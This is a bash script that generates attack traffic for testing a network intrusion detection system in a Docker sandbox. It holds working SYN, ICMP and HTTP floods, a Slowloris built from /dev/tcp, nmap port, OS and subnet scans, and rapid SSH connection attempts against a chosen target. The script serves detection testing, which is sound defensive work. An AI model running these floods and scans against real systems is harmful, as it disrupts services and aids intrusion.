#!/bin/bash
# Generate attack traffic patterns for NIDS detection testing.
#
# Usage: ./generate-attacks.sh [victim_ip] [attack_type]
#
# Attack types (matches NIDS model classes):
#   all         - Run all attacks sequentially (default)
#   syn_flood   - SYN flood (DDoS-TCP_Flood)
#   icmp_flood  - ICMP flood (DDoS-ICMP_Flood)
#   port_scan   - Port scanning (Recon-PortScan)
#   os_scan     - OS fingerprint scanning (Recon-OSScan)
#   ping_sweep  - Ping sweep (Recon-PingSweep)
#   http_flood  - HTTP flood (DDoS-HTTP_Flood)
#   slowloris   - Slowloris (DoS-SlowHTTPTest / DoS-Slowloris)
#   brute_force - SSH brute force (BruteForce-SSH)
#
# WARNING: These scripts generate ACTUAL attack traffic.
#          Only use within the isolated Docker sandbox network.

set -e

VICTIM="${1:-victim}"
ATTACK="${2:-all}"

echo "[attack] Target: ${VICTIM}"
echo "[attack] Attack: ${ATTACK}"
echo ""

run_syn_flood() {
    echo "[attack] === SYN Flood (DDoS-TCP_Flood) ==="
    echo "[attack] Sending SYN packets at high rate for 15s..."
    hping3 -S --flood -p 8080 -q "$VICTIM" &
    local pid=$!
    sleep 15
    kill $pid 2>/dev/null || true
    wait $pid 2>/dev/null || true
    echo "[attack] SYN flood complete."
    echo ""
}

run_icmp_flood() {
    echo "[attack] === ICMP Flood (DDoS-ICMP_Flood) ==="
    echo "[attack] Sending ICMP echo at flood rate for 15s..."
    hping3 --icmp --flood -q "$VICTIM" &
    local pid=$!
    sleep 15
    kill $pid 2>/dev/null || true
    wait $pid 2>/dev/null || true
    echo "[attack] ICMP flood complete."
    echo ""
}

run_port_scan() {
    echo "[attack] === Port Scan (Recon-PortScan) ==="
    echo "[attack] Scanning top 1000 ports..."
    nmap -sS -T4 --top-ports 1000 "$VICTIM" 2>/dev/null || true
    echo "[attack] Port scan complete."
    echo ""
}

run_os_scan() {
    echo "[attack] === OS Fingerprint Scan (Recon-OSScan) ==="
    echo "[attack] Running OS detection..."
    nmap -O -T4 "$VICTIM" 2>/dev/null || true
    echo "[attack] OS scan complete."
    echo ""
}

run_ping_sweep() {
    echo "[attack] === Ping Sweep (Recon-PingSweep) ==="
    echo "[attack] Sweeping subnet..."
    # Get the subnet from the victim IP
    local subnet
    subnet=$(echo "$VICTIM" | sed 's/\.[0-9]*$/.0\/24/')
    nmap -sn -T4 "$subnet" 2>/dev/null || true
    echo "[attack] Ping sweep complete."
    echo ""
}

run_http_flood() {
    echo "[attack] === HTTP Flood (DDoS-HTTP_Flood) ==="
    echo "[attack] Sending 1000 concurrent HTTP requests for 15s..."
    ab -n 10000 -c 100 -t 15 "http://${VICTIM}:8080/" 2>/dev/null || true
    echo "[attack] HTTP flood complete."
    echo ""
}

run_slowloris() {
    echo "[attack] === Slowloris (DoS-Slowloris) ==="
    echo "[attack] Opening slow HTTP connections for 30s..."
    # Open many partial HTTP connections
    for i in $(seq 1 50); do
        {
            exec 3<>/dev/tcp/"$VICTIM"/8080 2>/dev/null || true
            echo -ne "GET / HTTP/1.1\r\nHost: ${VICTIM}\r\n" >&3 2>/dev/null || true
            for _ in $(seq 1 6); do
                echo -ne "X-Slow-${i}: keep-alive\r\n" >&3 2>/dev/null || true
                sleep 5
            done
            exec 3>&- 2>/dev/null || true
        } &
    done
    sleep 30
    # Clean up background processes
    jobs -p | xargs -r kill 2>/dev/null || true
    wait 2>/dev/null
    echo "[attack] Slowloris complete."
    echo ""
}

run_brute_force() {
    echo "[attack] === SSH Brute Force (BruteForce-SSH) ==="
    echo "[attack] Rapid SSH connection attempts for 15s..."
    local end=$((SECONDS + 15))
    while [ $SECONDS -lt $end ]; do
        # Rapid connection attempts (will fail auth, but generates the flow pattern)
        nc -w 1 -z "$VICTIM" 22 2>/dev/null || true
        sleep 0.05
    done
    echo "[attack] SSH brute force complete."
    echo ""
}

# ── Main ──────────────────────────────────────────────────────────
case "$ATTACK" in
    syn_flood)    run_syn_flood ;;
    icmp_flood)   run_icmp_flood ;;
    port_scan)    run_port_scan ;;
    os_scan)      run_os_scan ;;
    ping_sweep)   run_ping_sweep ;;
    http_flood)   run_http_flood ;;
    slowloris)    run_slowloris ;;
    brute_force)  run_brute_force ;;
    all)
        echo "[attack] Running all attacks sequentially..."
        echo "[attack] Waiting 5s for NIDS to initialize..."
        sleep 5

        run_syn_flood
        sleep 3
        run_icmp_flood
        sleep 3
        run_port_scan
        sleep 3
        run_os_scan
        sleep 3
        run_ping_sweep
        sleep 3
        run_http_flood
        sleep 3
        run_slowloris
        sleep 3
        run_brute_force

        echo "[attack] === All attacks complete ==="
        ;;
    *)
        echo "Unknown attack type: ${ATTACK}"
        echo "Valid types: all, syn_flood, icmp_flood, port_scan, os_scan,"
        echo "             ping_sweep, http_flood, slowloris, brute_force"
        exit 1
        ;;
esac
